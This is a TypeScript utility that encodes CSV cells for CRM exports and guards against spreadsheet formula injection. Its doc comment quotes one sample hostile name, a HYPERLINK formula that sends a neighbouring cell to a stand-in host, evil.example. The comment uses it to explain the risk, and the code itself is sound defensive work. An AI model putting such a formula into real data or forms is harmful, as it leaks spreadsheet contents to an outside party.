/**
 * CSV cell encoding for CRM exports.
 *
 * Names, emails, notes and "how did you hear" values arrive from strangers
 * (public forms, WhatsApp). A cell that starts with = + - @ tab or CR is run as
 * a formula by Excel and Sheets when staff open the export, which is how a
 * hostile full name such as =HYPERLINK("https://evil.example/?"&C2,"x") leaks
 * the neighbouring cells. A leading apostrophe makes the spreadsheet treat the
 * cell as text. Numbers are passed through untouched so negative amounts stay
 * numeric. Always wrapped in quotes with embedded quotes doubled.
 */
export function csvCell(value: unknown): string {
  if (typeof value === 'number' && Number.isFinite(value)) return `"${value}"`
  const v = String(value ?? '')
  const guarded = /^[=+\-@\t\r]/.test(v) ? `'${v}` : v
  return `"${guarded.replace(/"/g, '""')}"`
}

export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(',')
}
